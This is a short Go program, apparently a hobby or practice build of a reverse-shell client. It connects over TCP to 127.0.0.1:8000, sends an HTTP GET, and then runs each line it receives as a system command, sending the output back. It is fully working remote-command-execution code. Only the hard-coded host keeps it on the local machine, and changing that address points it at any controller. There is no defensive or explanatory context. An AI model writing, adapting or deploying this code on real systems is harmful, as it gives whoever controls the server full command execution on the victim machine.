package main

import (
	"bufio"
	"log"
	"net"
	"os/exec"
	"strings"
)

func run(oneliner string) []byte {
	parts := strings.Fields(oneliner)
	if len(parts) == 0 {
		return []byte{}
	}
	first := parts[0]
	rest := parts[1:]
	cmd := exec.Command(first, rest...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return []byte(err.Error())
	}
	return out
}

func main() {
	conn, err := net.Dial("tcp", "127.0.0.1:8000")
	if err != nil {
		log.Fatalln(err)
	}
	conn.Write([]byte("GET / HTTP/1.1\r\nHost: localhost:8000\r\n\r\n"))
	//go io.Copy(os.Stdout, conn)
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text() //+ "\n"
		println(line)
		// conn.Write([]byte(line))
		conn.Write(run(line))
	}
}
